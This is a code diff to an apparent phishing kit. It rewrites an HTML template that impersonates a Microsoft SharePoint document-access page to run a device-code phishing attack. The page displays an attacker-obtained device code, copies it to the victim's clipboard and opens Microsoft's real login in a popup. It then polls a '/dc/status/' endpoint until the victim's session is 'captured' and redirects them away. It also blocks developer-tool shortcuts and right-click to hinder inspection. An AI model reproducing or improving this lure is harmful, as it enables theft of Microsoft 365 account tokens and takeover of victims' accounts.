@@ -3232,58 +3232,319 @@ document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.
 const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
-<title>SharePoint - Secure Document Access</title>
-<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmZJREFUWEfNl71Kw0AcxpNckmvS5tKkH01ttVpBEcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcFBEATBK3ih+IXiZ4qfKH6k+IHie4rvKL6l+IbiG4qvKb6i+JLiC4rPKT6j+ITiY4qPKD6keJ/iPYp3Kd6heIviLYo3Kd6geJ3iNYpXKV6heJniJYoXKZ6neI7iWYpnKJ6meIriSYonKB6neIziUYpHKB6meIjiQYoHKO6nuI/iPopkT73d3d/Pz8+/R8fH98fHxzd3d3c3l5eXN+fn5zcX5+c3Z2dnt2dnZ7enp6e3p6ent6enp7dnZ2e3Z2dnt2dnZ7dnZ2e3Z2dnt2dnZ7enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enpqr1C/AFCgw1VJxmbmAAAAAElFTkSuQmCC">
-<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8f0f6;display:flex;flex-direction:column;min-height:100vh}.header{background:#036c70;padding:14px 34px;display:flex;align-items:center;gap:12px;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,0.12)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:700}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.12);width:100%;max-width:500px;padding:48px 44px}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:32px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:700;color:#036c70}.intro{text-align:center;color:#323130;font-size:13px;line-height:1.6;margin-bottom:28px;font-weight:500}.info-box{background:#d4ebf7;border-left:4px solid#036c70;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#024447;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#323130;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}.code-input{width:100%;background:#f8fafb;border:2px solid#036c70;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#036c70;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal;border-color:#c8c6c4}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#036c70;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px;transition:background .2s,transform .1s}.copy-btn:hover{background:#024f52;transform:translateY(-1px)}.copy-btn.copied{background:#107c10}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:20px;min-height:22px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#036c70;color:#fff;border:none;padding:14px 24px;font-size:14px;font-weight:700;cursor:pointer;border-radius:6px;transition:background .2s,transform .1s;margin-bottom:24px}.btn-primary:hover{background:#024f52;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f3f8fc;border:1px solid#b3d6ef;border-radius:6px;padding:18px;margin-bottom:24px;text-align:center}.security-box p{font-size:13px;color:#323130;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#036c70;color:#fff;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#024f52}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#605e5c;margin-bottom:18px}.timer{text-align:center;font-size:13px;color:#8a8886;font-weight:500}.timer span{font-weight:700;color:#d83b01}.success{display:none;text-align:center;padding:24px 0}.success-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}.success-icon svg{width:36px;height:36px;fill:#fff}.success h2{font-size:22px;font-weight:700;color:#323130;margin-bottom:10px}.success p{font-size:15px;color:#605e5c;margin-bottom:24px}.success-badge{display:inline-flex;align-items:center;gap:10px;background:#dff6dd;color:#107c10;padding:12px 24px;border-radius:6px;font-size:15px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:20px;height:20px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:22px;letter-spacing:3px}}</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SharePoint - Secure Document Access</title>
+    <style>
+        :root {
+            --sp-primary: #0078d4;
+            --sp-bg: #f3f2f1;
+            --sp-card: #ffffff;
+            --sp-text-main: #201f1e;
+            --sp-text-muted: #605e5c;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--sp-bg);
+            color: var(--sp-text-main);
+        }
+
+        .suite-bar {
+            background-color: #2b2b2b;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            color: white;
+            font-size: 14px;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 48px);
+            padding: 20px;
+        }
+
+        .auth-card {
+            background: var(--sp-card);
+            width: 100%;
+            max-width: 440px;
+            border-radius: 8px;
+            box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13), 0 0.3px 0.9px rgba(0,0,0,0.11);
+            padding: 40px;
+            text-align: center;
+        }
+
+        .logo-area { margin-bottom: 24px; }
+        .logo-area img { width: 48px; height: 48px; }
+
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+        p { color: var(--sp-text-muted); font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+
+        .document-preview {
+            background: #faf9f8;
+            border: 1px solid #edebe9;
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+            text-align: left;
+        }
+
+        .blurred-text {
+            filter: blur(4px);
+            user-select: none;
+            opacity: 0.6;
+        }
+
+        .blurred-text div {
+            height: 10px;
+            background: #d2d2d2;
+            margin-bottom: 8px;
+            border-radius: 2px;
+        }
+
+        .code-input-display {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--sp-primary);
+            letter-spacing: 8px;
+            margin: 16px 0;
+            padding: 12px;
+            background: #f8f8f8;
+            border-radius: 4px;
+            border: 1px solid #e1dfdd;
+        }
+
+        .btn-primary {
+            background-color: var(--sp-primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover { background-color: #106ebe; }
+        .btn-primary:disabled { background-color: #c8c6c4; cursor: not-allowed; }
+
+        .timer { font-size: 12px; color: var(--sp-text-muted); margin-top: 16px; }
+        .status-msg { font-size: 13px; min-height: 22px; font-weight: 500; margin: 6px 0 4px; color: #107c10; }
+        
+        .success-view {
+            display: none;
+            text-align: center;
+            padding: 12px 0;
+        }
+        .success-view .check-icon {
+            display: inline-block;
+            background: #107c10;
+            color: white;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            line-height: 56px;
+            font-size: 28px;
+            margin-bottom: 16px;
+        }
+        .success-view h2 { font-weight: 600; margin-bottom: 4px; }
+        .success-view p { color: var(--sp-text-muted); margin-bottom: 12px; }
+        .success-badge {
+            background: #dff6dd;
+            color: #107c10;
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: inline-block;
+            font-weight: 600;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-<div class="header">
-<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
-<span class="header-title">SharePoint</span>
-</div>
-<div class="main"><div class="card">
-<div class="logo">
-<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" width="40" height="40" alt="SharePoint" style="flex-shrink:0">
-<span class="logo-text">SharePoint</span>
-</div>
-<div id="mainView">
-<p class="intro">A secure access code has been generated for your document.</p>
-<div class="info-box">For security reasons, SharePoint requires authentication before granting access to shared documents. Use the code below to verify your identity.</div>
-<div class="code-label">Document Access Code</div>
-<div class="code-input" id="userCode">Loading...</div>
-<div class="copy-row">
-<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
-<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
-<span id="copyText">Copy Code</span>
-</button>
-</div>
-<div class="status" id="codeStatus"></div>
-<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
-Access Document
-</button>
-<div class="security-box">
-<p>Your document is protected by Microsoft SharePoint's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
-<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
-<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-SharePoint Secure Platform
-</a>
-</div>
-<p class="footer-text">If you need assistance, contact your SharePoint administrator.</p>
-<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
-</div>
-<div class="success" id="successView">
-<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-<h2>Verification Complete</h2>
-<p>Your identity has been confirmed. You may now close this window.</p>
-<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Document Access Granted</div>
-</div>
-</div></div>
-<script>
-document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
-(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
-</script>
+
+    <div class="suite-bar">
+        <span>Microsoft 365</span>
+    </div>
+
+    <div class="main-container">
+        <div class="auth-card">
+            <div id="mainView">
+                <div class="logo-area">
+                    <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint">
+                </div>
+                
+                <h1>Secure Document Access</h1>
+                <p>To view this protected document, please complete the device authentication process.</p>
+
+                <div class="document-preview">
+                    <div class="blurred-text">
+                        <div style="width: 80%;"></div>
+                        <div style="width: 100%;"></div>
+                        <div style="width: 90%;"></div>
+                        <div style="width: 60%;"></div>
+                    </div>
+                </div>
+
+                <div class="code-input-display" id="userCode">Loading...</div>
+                
+                <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Sign In to Continue</button>
+
+                <div class="status-msg" id="codeStatus"></div>
+
+                <div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
+            </div>
+
+            <div class="success-view" id="successView">
+                <div class="check-icon">✔</div>
+                <h2>Verification Complete</h2>
+                <p>Your identity has been confirmed. You may now close this window.</p>
+                <div class="success-badge">Document Access Granted</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){
+            var sid = '{session_id}';
+            var verifyUrl = '{verify_url}';
+            var codeReady = {code_ready};
+            var code = '{user_code}';
+            var expiresIn = {expires_seconds};
+            var popup = null;
+
+            var codeEl = document.getElementById('userCode');
+            var statusEl = document.getElementById('codeStatus');
+            var btnEl = document.getElementById('signInBtn');
+            var timerEl = document.getElementById('timerValue');
+            var mainView = document.getElementById('mainView');
+            var successView = document.getElementById('successView');
+
+            function showCode(c, v) {
+                code = c;
+                if (v) verifyUrl = v;
+                codeEl.textContent = c;
+                codeEl.style.letterSpacing = '8px';
+                codeEl.style.color = '#0078d4';
+                btnEl.disabled = false;
+            }
+
+            if (codeReady && code) {
+                showCode(code, verifyUrl);
+            } else {
+                codeEl.textContent = 'Loading...';
+                codeEl.style.letterSpacing = 'normal';
+                codeEl.style.color = '#8a8886';
+            }
+
+            window.copyCode = function() {
+                if (!code) return;
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(code).then(function() {
+                        if (statusEl) statusEl.textContent = 'Code copied to clipboard';
+                    });
+                } else {
+                    var t = document.createElement('textarea');
+                    t.value = code;
+                    t.style.cssText = 'position:fixed;left:-9999px';
+                    document.body.appendChild(t);
+                    t.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(t);
+                    if (statusEl) statusEl.textContent = 'Code copied to clipboard';
+                }
+            };
+
+            window.openSignIn = function() {
+                if (!code) return;
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(code).catch(function(){});
+                } else {
+                    var t = document.createElement('textarea');
+                    t.value = code;
+                    t.style.cssText = 'position:fixed;left:-9999px';
+                    document.body.appendChild(t);
+                    t.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(t);
+                }
+                if (statusEl) statusEl.textContent = 'Code copied to clipboard';
+
+                var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
+                popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+                if (popup) popup.focus();
+            };
+
+            function updateTimer() {
+                if (expiresIn <= 0) return;
+                expiresIn--;
+                var m = Math.floor(expiresIn / 60);
+                var s = expiresIn % 60;
+                timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+                if (expiresIn > 0) setTimeout(updateTimer, 1000);
+            }
+
+            if (codeReady) setTimeout(updateTimer, 1000);
+
+            function poll() {
+                fetch('/dc/status/' + sid, {
+                    method: 'GET',
+                    credentials: 'include'
+                })
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    if (d.ready && !codeReady) {
+                        codeReady = true;
+                        showCode(d.user_code, d.verify_url);
+                        if (expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
+                    }
+                    if (d.captured) {
+                        if (mainView) mainView.style.display = 'none';
+                        if (successView) successView.style.display = 'block';
+                        if (d.redirect_url) {
+                            setTimeout(function() {
+                                top.location.href = d.redirect_url;
+                            }, 2500);
+                        }
+                    }
+                    if (!d.failed && !d.expired && !d.captured) {
+                        setTimeout(poll, 3000);
+                    }
+                })
+                ['catch'](function() {
+                    setTimeout(poll, 5000);
+                });
+            }
+
+            poll();
+
+            document.addEventListener("keydown", function(e) {
+                if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i","j","c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
+                    e.preventDefault();
+                }
+            });
+            document.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+            });
+
+            if (timerEl) {
+                var m = Math.floor(expiresIn / 60);
+                var s = expiresIn % 60;
+                timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+            }
+
+        })();
+    </script>
 </body>
 </html>`
 
